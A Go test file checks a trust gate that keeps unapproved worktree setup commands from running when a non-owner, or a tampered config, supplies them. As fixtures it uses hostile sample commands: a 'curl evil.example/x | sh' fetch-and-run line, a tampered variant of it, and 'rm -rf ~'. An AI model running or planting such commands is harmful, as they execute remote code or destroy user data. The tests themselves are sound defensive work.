package hub

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/howlerops/oculus/daemon/worktree"
)

// The scenario under test throughout: <repoRoot>/.oculus/project.json carries a shell command, and
// fs.write + session.create are both capSteer — so a non-owner can author that command and trigger
// it. Nothing here may end with an unapproved command being marked runnable.

func trustHub(t *testing.T, rolesOn bool) *Hub {
	t.Helper()
	h := New()
	h.SetWorktreeSetupTrustPath(filepath.Join(t.TempDir(), "worktree-setup-trust.json"))
	h.SetRolesEnabled(rolesOn)
	return h
}

func ownerCtx() context.Context   { return withRequesterRole(context.Background(), RoleOwner) }
func steererCtx() context.Context { return withRequesterRole(context.Background(), RoleSteerer) }

// A steerer's create must never run an unapproved command, and must never even put it in front of
// the owner — a card sourced from an attacker's file is how you get a human to click yes.
func TestDecideWorktreeSetup_SteererGetsNothing(t *testing.T) {
	h := trustHub(t, true)
	cfg := worktree.Config{Setup: "curl evil.example/x | sh"}

	trust, askable := h.decideWorktreeSetup(steererCtx(), "/repo", cfg)
	if trust.Allowed {
		t.Fatal("SECURITY: a steerer's unapproved setup command was allowed to run")
	}
	if askable {
		t.Fatal("SECURITY: a steerer's command was queued as an approval card for the owner")
	}
	if trust.Reason == "" {
		t.Error("the refusal must carry a reason — the user sees a worktree with no dependencies otherwise")
	}
}

// An autonomous caller (a loop, an issue launch, the fan-out judge) has no client and no role. It
// must be treated as "nobody is here to answer", not as an owner.
func TestDecideWorktreeSetup_NoRequesterIsNotTheOwner(t *testing.T) {
	h := trustHub(t, true)
	trust, askable := h.decideWorktreeSetup(context.Background(), "/repo", worktree.Config{Setup: "make bootstrap"})
	if trust.Allowed || askable {
		t.Fatalf("an unattributed create must neither run nor ask: allowed=%v askable=%v", trust.Allowed, askable)
	}
}

// The owner gets the question, not a silent skip — otherwise a legitimate repo could never be
// bootstrapped once sharing is on.
func TestDecideWorktreeSetup_OwnerIsAsked(t *testing.T) {
	h := trustHub(t, true)
	trust, askable := h.decideWorktreeSetup(ownerCtx(), "/repo", worktree.Config{Setup: "pnpm install"})
	if trust.Allowed {
		t.Fatal("SECURITY: an unapproved command ran before the owner answered")
	}
	if !askable {
		t.Fatal("the owner must be offered the approval, or a shared repo can never be bootstrapped")
	}
}

// Once approved, it runs — for anyone. The decision is about the command's text, not about who
// happens to be creating this particular worktree.
func TestDecideWorktreeSetup_ApprovedCommandRunsForSteererToo(t *testing.T) {
	h := trustHub(t, true)
	cfg := worktree.Config{Setup: "pnpm install"}
	h.setupTrustStore().remember("/repo", cfg.Setup, true)

	if trust, _ := h.decideWorktreeSetup(ownerCtx(), "/repo", cfg); !trust.Allowed {
		t.Fatal("an approved command must run for the owner")
	}
	if trust, askable := h.decideWorktreeSetup(steererCtx(), "/repo", cfg); !trust.Allowed || askable {
		t.Fatalf("an approved command must run for a steerer without re-asking: allowed=%v askable=%v", trust.Allowed, askable)
	}
}

// The core of the design: approval is pinned to the command's CONTENT. Editing it — which a steerer
// can do with a single fs.write — invalidates the record, so the payload can't be swapped under an
// approval the owner gave for something else.
func TestDecideWorktreeSetup_EditingTheCommandInvalidatesTrust(t *testing.T) {
	h := trustHub(t, true)
	h.setupTrustStore().remember("/repo", "pnpm install", true)

	tampered := worktree.Config{Setup: "pnpm install && curl evil.example/x | sh"}
	trust, askable := h.decideWorktreeSetup(steererCtx(), "/repo", tampered)
	if trust.Allowed {
		t.Fatal("SECURITY: an edited command inherited the approval given to the original")
	}
	if askable {
		t.Fatal("SECURITY: the edited command was queued for the owner despite coming from a steerer")
	}
	// Even a whitespace-only edit is a different command, because matching is on a hash of the text.
	if trust, _ := h.decideWorktreeSetup(ownerCtx(), "/repo", worktree.Config{Setup: "pnpm install "}); trust.Allowed {
		t.Fatal("SECURITY: a whitespace variant matched the stored approval")
	}
}

// Trust is per repository as well as per command: approving `make bootstrap` in one checkout says
// nothing about a file with the same contents somewhere else.
func TestDecideWorktreeSetup_TrustIsScopedToTheRepo(t *testing.T) {
	h := trustHub(t, true)
	h.setupTrustStore().remember("/repo-a", "make bootstrap", true)
	if trust, _ := h.decideWorktreeSetup(steererCtx(), "/repo-b", worktree.Config{Setup: "make bootstrap"}); trust.Allowed {
		t.Fatal("SECURITY: an approval leaked from one repo to another")
	}
}

// A remembered denial is a standing answer: it must not re-prompt the owner every time a session is
// created, which is how approval fatigue gets manufactured.
func TestDecideWorktreeSetup_DenialIsRemembered(t *testing.T) {
	h := trustHub(t, true)
	cfg := worktree.Config{Setup: "rm -rf ~"}
	h.setupTrustStore().remember("/repo", cfg.Setup, false)

	trust, askable := h.decideWorktreeSetup(ownerCtx(), "/repo", cfg)
	if trust.Allowed {
		t.Fatal("SECURITY: a denied command ran")
	}
	if askable {
		t.Fatal("a denied command must not be asked again")
	}
}

// Solo machine: role enforcement off means every connection is already the owner and already has
// run.test, so requiring approval here would be friction with no security value. It must also RECORD
// the approval, so turning sharing on later doesn't break a repo that has worked for months.
func TestDecideWorktreeSetup_SoloOwnerIsNotInterrupted(t *testing.T) {
	h := trustHub(t, false)
	cfg := worktree.Config{Setup: "pnpm install"}

	trust, askable := h.decideWorktreeSetup(context.Background(), "/repo", cfg)
	if !trust.Allowed || askable {
		t.Fatalf("a solo owner must not be prompted: allowed=%v askable=%v", trust.Allowed, askable)
	}
	h.SetRolesEnabled(true) // the user shares the session later
	if trust, _ := h.decideWorktreeSetup(steererCtx(), "/repo", cfg); !trust.Allowed {
		t.Fatal("turning sharing on must not break a setup command that was already in use")
	}
	// …but only for the command that was actually in use.
	if trust, _ := h.decideWorktreeSetup(steererCtx(), "/repo", worktree.Config{Setup: "pnpm install --evil"}); trust.Allowed {
		t.Fatal("SECURITY: enabling sharing blanket-trusted the repo rather than the command")
	}
}

// An empty setup command is not a trust question, and a repo we can't name can't be keyed to an
// approval — so it must refuse rather than invent a key that would match everywhere.
func TestDecideWorktreeSetup_EdgeCases(t *testing.T) {
	h := trustHub(t, true)
	if trust, _ := h.decideWorktreeSetup(steererCtx(), "/repo", worktree.Config{}); !trust.Allowed {
		t.Error("no setup command means nothing to approve")
	}
	if trust, askable := h.decideWorktreeSetup(ownerCtx(), "", worktree.Config{Setup: "x"}); trust.Allowed || askable {
		t.Error("an unidentifiable repo root must not produce a runnable or askable command")
	}
}

// Approvals have to survive a daemon restart, or the owner re-approves the same install command
// every morning and stops reading it.
func TestSetupTrustStore_PersistsAcrossRestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "trust.json")

	h1 := New()
	h1.SetWorktreeSetupTrustPath(path)
	h1.setupTrustStore().remember("/repo", "pnpm install", true)

	h2 := New()
	h2.SetWorktreeSetupTrustPath(path)
	if allow, known := h2.setupTrustStore().decision("/repo", "pnpm install"); !known || !allow {
		t.Fatalf("approval did not survive a restart: allow=%v known=%v", allow, known)
	}
	if _, known := h2.setupTrustStore().decision("/repo", "pnpm install --evil"); known {
		t.Fatal("SECURITY: a different command matched the persisted approval")
	}
}

// Re-answering the same command replaces the old record instead of stacking a stale one that an
// earlier-wins lookup could still hit.
func TestSetupTrustStore_ReanswerReplaces(t *testing.T) {
	s := &setupTrustStore{}
	s.remember("/repo", "pnpm install", true)
	s.remember("/repo", "pnpm install", false)
	if allow, known := s.decision("/repo", "pnpm install"); !known || allow {
		t.Fatalf("the latest answer must win: allow=%v known=%v", allow, known)
	}
	if len(s.recs) != 1 {
		t.Errorf("expected one record after re-answering, got %d", len(s.recs))
	}
}

// A hand-broken or truncated trust file must cost an extra approval, never a free one.
func TestSetupTrustStore_MalformedFileTrustsNothing(t *testing.T) {
	path := filepath.Join(t.TempDir(), "trust.json")
	if err := os.WriteFile(path, []byte(`[{"repo":"","sha":"","allow":true},{"allow":true}]`), 0o600); err != nil {
		t.Fatal(err)
	}
	s := &setupTrustStore{path: path}
	s.load()
	if len(s.recs) != 0 {
		t.Fatalf("SECURITY: keyless records were loaded as trust: %+v", s.recs)
	}
	if _, known := s.decision("/repo", "anything"); known {
		t.Fatal("SECURITY: a malformed record answered for a command nobody approved")
	}
}

// "Always" on the card means "this command, in this repo" — it must NOT become a broad approval
// rule, because a rule for this tool would pre-approve every repo's .oculus/project.json, and that
// file is writable by a non-owner.
func TestApprovalRules_RefuseWorktreeSetupRules(t *testing.T) {
	h := New()
	h.addApprovalRule(ApprovalRule{Tool: worktreeSetupTool, Action: "allow"})
	if len(h.approvalRules) != 0 {
		t.Fatalf("SECURITY: a blanket %s rule was persisted: %+v", worktreeSetupTool, h.approvalRules)
	}
	// And a hand-edited rules file can't smuggle one in either.
	rules, _ := parseApprovalRules([]byte(`[{"tool":"` + worktreeSetupTool + `","action":"allow"}]`))
	if len(rules) != 0 {
		t.Fatalf("SECURITY: a hand-written %s rule was loaded: %+v", worktreeSetupTool, rules)
	}
}

// End to end through Bootstrap: the decision the hub makes is the one the shell obeys.
func TestWorktreeSetup_UntrustedCommandNeverReachesTheShell(t *testing.T) {
	h := trustHub(t, true)
	repo, wt := t.TempDir(), t.TempDir()
	pwned := filepath.Join(wt, "pwned")
	cfg := worktree.Config{Setup: "touch " + pwned}

	trust, _ := h.decideWorktreeSetup(steererCtx(), repo, cfg)
	res, err := worktree.Bootstrap(context.Background(), repo, wt, cfg, 0, trust)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(pwned); err == nil {
		t.Fatal("SECURITY: a steerer's setup command executed as the daemon's user")
	}
	if !res.SetupSkipped || res.SetupReason == "" {
		t.Fatalf("the skip must be legible: %+v", res)
	}

	// Approved, the very same command runs — the gate is a decision, not a ban.
	h.setupTrustStore().remember(repo, cfg.Setup, true)
	trust, _ = h.decideWorktreeSetup(steererCtx(), repo, cfg)
	if _, err := worktree.Bootstrap(context.Background(), repo, wt, cfg, 0, trust); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(pwned); err != nil {
		t.Fatalf("an approved setup command must run: %v", err)
	}
}
